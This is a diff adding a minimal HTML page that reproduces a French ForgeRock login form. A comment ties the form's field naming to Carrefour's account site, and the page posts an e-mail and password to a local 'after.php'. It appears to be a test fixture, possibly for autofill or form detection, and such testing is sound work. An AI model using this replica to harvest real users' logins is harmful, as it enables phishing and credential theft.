@@ -1,0 +1,10 @@
+<!doctype html><meta charset=utf-8><title>ForgeRock</title>
+<style>body{font:16px sans-serif;padding:40px} input{display:block;margin:10px 0;padding:8px;width:260px}</style>
+<h1>Connexion</h1>
+<!-- formulaire ForgeRock AM / XUI (moncompte.carrefour.fr…) : champs nommés idToken1, idToken2… -->
+<form action="after.php" method="post" autocomplete="off">
+  <label for="idToken1">E-mail *</label><input id="idToken1" name="callback_0" type="email" autocomplete="email" required>
+  <label for="idToken2">Mot de passe *</label><input id="idToken2" name="callback_1" type="password" autocomplete="current-password" required>
+  <input type="hidden" id="idToken3" name="callback_2">
+  <input id="loginButton_0" name="callback_3" type="submit" value="Me connecter">
+</form>
